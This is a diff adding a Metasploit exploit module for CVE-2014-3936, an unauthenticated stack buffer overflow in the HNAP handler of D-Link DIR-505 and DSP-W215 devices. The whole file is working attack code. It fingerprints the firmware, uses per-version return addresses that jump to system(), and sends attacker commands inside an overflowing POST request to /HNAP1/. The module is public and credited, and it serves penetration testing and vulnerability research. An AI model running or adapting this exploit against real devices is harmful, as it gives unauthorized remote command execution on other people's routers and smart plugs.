@@ -1,0 +1,152 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'D-Link HNAP Request Remote Buffer Overflow',
+      'Description'    => %q{
+        This module exploits an anonymous remote code execution vulnerability on different
+        D-Link devices. The vulnerability is due to an stack based buffer overflow while
+        handling malicious HTTP POST requests addressed to the HNAP handler. This module
+        has been successfully tested on D-Link DIR-505 in an emulated environment.
+      },
+      'Author'         =>
+        [
+          'Craig Heffner', # vulnerability discovery and initial exploit
+          'Michael Messner <devnull[at]s3cur1ty.de>' # Metasploit module
+        ],
+      'License'        => MSF_LICENSE,
+      'Platform'       => 'linux',
+      'Arch'           => ARCH_MIPSBE,
+      'References'     =>
+        [
+          ['CVE', '2014-3936'],
+          ['BID', '67651'],
+          ['URL', 'http://www.devttys0.com/2014/05/hacking-the-d-link-dsp-w215-smart-plug/'], # blog post from Craig including PoC
+          ['URL', 'http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10029']
+        ],
+      'Targets'        =>
+        [
+          #
+          # Automatic targeting via fingerprinting
+          #
+          [ 'Automatic Targeting', { 'auto' => true }  ],
+          [ 'D-Link DSP-W215 - v1.0',
+            {
+              'Offset'  => 1000000,
+              'Ret'     => 0x405cac, # jump to system - my_cgi.cgi
+            }
+          ],
+          [ 'D-Link DIR-505 - v1.06',
+            {
+              'Offset'  => 30000,
+              'Ret'     => 0x405234, # jump to system - my_cgi.cgi
+            }
+          ],
+          [ 'D-Link DIR-505 - v1.07',
+            {
+              'Offset'  => 30000,
+              'Ret'     => 0x405c5c, # jump to system - my_cgi.cgi
+            }
+          ]
+        ],
+      'DisclosureDate' => 'May 15 2014',
+      'DefaultTarget'  => 0))
+
+    deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')
+  end
+
+  def check
+    begin
+      res = send_request_cgi({
+        'uri' => "/HNAP1/",
+        'method'  => 'GET'
+      })
+
+      if res && [200, 301, 302].include?(res.code)
+        if res.body =~ /DIR-505/ && res.body =~ /1.07/
+          @my_target = targets[3] if target['auto']
+          return Exploit::CheckCode::Appears
+        elsif res.body =~ /DIR-505/ && res.body =~ /1.06/
+          @my_target = targets[2] if target['auto']
+          return Exploit::CheckCode::Appears
+        elsif res.body =~ /DSP-W215/ && res.body =~ /1.00/
+          @my_target = targets[1] if target['auto']
+          return Exploit::CheckCode::Appears
+        else
+          return Exploit::CheckCode::Detected
+        end
+      end
+    rescue ::Rex::ConnectionError
+      return Exploit::CheckCode::Safe
+    end
+
+    Exploit::CheckCode::Unknown
+  end
+
+  def exploit
+    print_status("#{peer} - Trying to access the vulnerable URL...")
+
+    @my_target = target
+    check_code = check
+
+    unless check_code == Exploit::CheckCode::Detected || check_code == Exploit::CheckCode::Appears
+      fail_with(Failure::NoTarget, "#{peer} - Failed to detect a vulnerable device")
+    end
+
+    if @my_target.nil? || @my_target['auto']
+      fail_with(Failure::NoTarget, "#{peer} - Failed to auto detect, try setting a manual target...")
+    end
+
+    print_status("#{peer} - Exploiting #{@my_target.name}...")
+    execute_cmdstager(
+      :flavor  => :echo,
+      :linemax => 185
+    )
+  end
+
+  def prepare_shellcode(cmd)
+    buf = rand_text_alpha_upper(@my_target['Offset'])  # Stack filler
+    buf << rand_text_alpha_upper(4)                    # $s0, don't care
+    buf << rand_text_alpha_upper(4)                    # $s1, don't care
+    buf << rand_text_alpha_upper(4)                    # $s2, don't care
+    buf << rand_text_alpha_upper(4)                    # $s3, don't care
+    buf << rand_text_alpha_upper(4)                    # $s4, don't care
+    buf << [@my_target.ret].pack("N")                  # $ra
+
+           # la $t9, system
+           # la $s1, 0x440000
+           # jalr $t9 ; system
+           # addiu $a0, $sp, 0x28 # our command
+
+    buf << rand_text_alpha_upper(40)                # Stack filler
+    buf << cmd                                      # Command to execute
+    buf << "\x00"                                   # NULL-terminate the command
+  end
+
+  def execute_command(cmd, opts)
+    shellcode = prepare_shellcode(cmd)
+
+    begin
+      res = send_request_cgi({
+        'method' => 'POST',
+        'uri' => "/HNAP1/",
+        'encode_params' => false,
+        'data' => shellcode
+      }, 5)
+      return res
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
+    end
+  end
+end
